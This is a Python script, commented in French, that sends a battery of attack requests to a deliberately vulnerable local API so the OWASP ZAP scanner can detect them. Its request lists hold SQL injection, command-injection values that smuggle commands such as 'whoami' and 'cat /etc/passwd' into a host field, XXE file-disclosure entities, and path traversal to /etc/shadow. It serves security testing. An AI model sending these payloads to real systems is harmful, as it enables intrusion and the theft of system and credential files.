#!/usr/bin/env python3
"""
Script de test actif pour déclencher TOUTES les vulnérabilités
Conçu pour que OWASP ZAP les détecte facilement
"""

import requests
import time
import sys

API = "http://localhost:8000"

def test_endpoint(method, path, data=None, params=None):
    """Test un endpoint et affiche le résultat"""
    try:
        url = f"{API}{path}"
        
        if method == "GET":
            resp = requests.get(url, params=params, timeout=3)
        elif method == "POST":
            resp = requests.post(url, data=data, timeout=3)
        else:
            return None
            
        return {
            "status": resp.status_code,
            "body": resp.text[:200],
            "success": resp.status_code < 500
        }
    except Exception as e:
        return {"status": "ERROR", "error": str(e), "success": False}


print("=" * 70)
print("🚀 ACTIVE VULNERABILITY TESTING - Version Améliorée DAST")
print("=" * 70)
print()

# Attendre que l'API soit prête
print("⏳ Waiting for API to be ready...")
for i in range(10):
    try:
        resp = requests.get(f"{API}/health", timeout=2)
        if resp.status_code == 200:
            print("✅ API is ready!")
            break
    except:
        time.sleep(1)
        if i == 9:
            print("❌ API not responding after 10 attempts!")
            sys.exit(1)

print()
print("🎯 Starting comprehensive vulnerability tests...")
print()

# ========== TESTS DE VULNÉRABILITÉS ==========

tests = [
    # 1. SQL Injection - Error-based
    {
        "name": "SQL Injection - Single Quote",
        "method": "GET",
        "path": "/vuln1/sql/search",
        "params": {"username": "admin'"},
        "expected": "SQL syntax error"
    },
    {
        "name": "SQL Injection - OR 1=1",
        "method": "GET",
        "path": "/vuln1/sql/search",
        "params": {"username": "admin' OR '1'='1"},
        "expected": "Bypass authentication"
    },
    {
        "name": "SQL Injection - Comment",
        "method": "GET",
        "path": "/vuln1/sql/search",
        "params": {"username": "admin'--"},
        "expected": "SQL comment injection"
    },
    
    # 2. SQL Injection - UNION-based
    {
        "name": "SQL Injection - UNION SELECT",
        "method": "GET",
        "path": "/vuln1/sql/union",
        "params": {"search": "test' UNION SELECT 1,2--"},
        "expected": "UNION attack"
    },
    {
        "name": "SQL Injection - UNION ALL",
        "method": "GET",
        "path": "/vuln1/sql/union",
        "params": {"search": "' UNION ALL SELECT name,price FROM products--"},
        "expected": "Data extraction"
    },
    
    # 3. Command Injection
    {
        "name": "Command Injection - Semicolon",
        "method": "GET",
        "path": "/vuln2/cmd/ping",
        "params": {"host": "127.0.0.1; whoami"},
        "expected": "Execute whoami command"
    },
    {
        "name": "Command Injection - AND operator",
        "method": "GET",
        "path": "/vuln2/cmd/ping",
        "params": {"host": "google.com && id"},
        "expected": "Execute id command"
    },
    {
        "name": "Command Injection - Pipe",
        "method": "GET",
        "path": "/vuln2/cmd/ping",
        "params": {"host": "127.0.0.1 | cat /etc/passwd"},
        "expected": "Read /etc/passwd"
    },
    {
        "name": "Command Injection - Backticks",
        "method": "GET",
        "path": "/vuln2/cmd/ping",
        "params": {"host": "127.0.0.1; ls -la"},
        "expected": "List directory"
    },
    
    # 4. XXE (XML External Entity)
    {
        "name": "XXE - File Disclosure /etc/passwd",
        "method": "POST",
        "path": "/vuln3/xxe/parse",
        "data": {
            "xml_data": '''<?xml version="1.0"?>
<!DOCTYPE test [ 
    <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
<test>&xxe;</test>'''
        },
        "expected": "Read /etc/passwd via XXE"
    },
    {
        "name": "XXE - File Disclosure /etc/hosts",
        "method": "POST",
        "path": "/vuln3/xxe/parse",
        "data": {
            "xml_data": '''<?xml version="1.0"?>
<!DOCTYPE test [ 
    <!ENTITY xxe SYSTEM "file:///etc/hosts"> 
]>
<test>&xxe;</test>'''
        },
        "expected": "Read /etc/hosts via XXE"
    },
    
    # 5. Path Traversal
    {
        "name": "Path Traversal - /etc/passwd",
        "method": "GET",
        "path": "/vuln4/file/read",
        "params": {"filename": "../../../etc/passwd"},
        "expected": "Read system passwd file"
    },
    {
        "name": "Path Traversal - /etc/shadow",
        "method": "GET",
        "path": "/vuln4/file/read",
        "params": {"filename": "../../../etc/shadow"},
        "expected": "Attempt to read shadow file"
    },
    {
        "name": "Path Traversal - Absolute path",
        "method": "GET",
        "path": "/vuln4/file/read",
        "params": {"filename": "/etc/hosts"},
        "expected": "Read hosts file"
    },
]

# Exécuter tous les tests
results = {"success": 0, "failed": 0, "total": len(tests)}

for i, test in enumerate(tests, 1):
    print(f"[{i}/{len(tests)}] {test['name']}")
    print("─" * 70)
    
    method = test["method"]
    path = test["path"]
    params = test.get("params")
    data = test.get("data")
    
    # Afficher la requête
    if params:
        param_str = "&".join([
            f"{k}={v[:40]}..." if len(str(v)) > 40 else f"{k}={v}" 
            for k, v in params.items()
        ])
        print(f"  → {method} {path}?{param_str}")
    else:
        print(f"  → {method} {path}")
        if data:
            print(f"  → Data: {str(data)[:60]}...")
    
    # Exécuter le test
    result = test_endpoint(method, path, data=data, params=params)
    
    # Afficher le résultat
    if result:
        status_emoji = "✅" if result["success"] else "⚠️"
        print(f"  {status_emoji} Status: {result['status']}")
        
        if result.get("error"):
            print(f"  ⚠️ Error: {result['error']}")
        elif result.get("body"):
            body_preview = result["body"].replace("\n", " ")[:100]
            print(f"  📄 Response: {body_preview}...")
        
        if result["success"]:
            results["success"] += 1
        else:
            results["failed"] += 1
    else:
        print("  ❌ Request failed")
        results["failed"] += 1
    
    print(f"  💡 Expected: {test['expected']}")
    print()
    
    # Petite pause entre les requêtes
    time.sleep(0.3)

# ========== RÉSUMÉ ==========
print("=" * 70)
print("📊 TEST SUMMARY")
print("=" * 70)
print(f"Total tests: {results['total']}")
print(f"✅ Successful requests: {results['success']}")
print(f"⚠️  Failed requests: {results['failed']}")
print()

print("⏳ Waiting 15 seconds for ZAP to capture and analyze all requests...")
print("   (ZAP needs time to process the traffic patterns)")
time.sleep(15)

print()
print("=" * 70)
print("✅ ALL VULNERABILITY TESTS COMPLETED")
print("=" * 70)
print()
print("📋 What happens next:")
print("  1. ZAP will now run its Active Scan on captured traffic")
print("  2. ZAP will analyze responses for vulnerability patterns")
print("  3. Check zap-reports/ for detected vulnerabilities")
print("  4. Expected: HIGH/MEDIUM alerts for SQL Injection, Command Injection, etc.")
print()
print("🔍 Expected DAST findings:")
print("  • SQL Injection (High Risk)")
print("  • Command Injection (High Risk)")
print("  • XXE Injection (High Risk)")
print("  • Path Traversal (Medium/High Risk)")
print()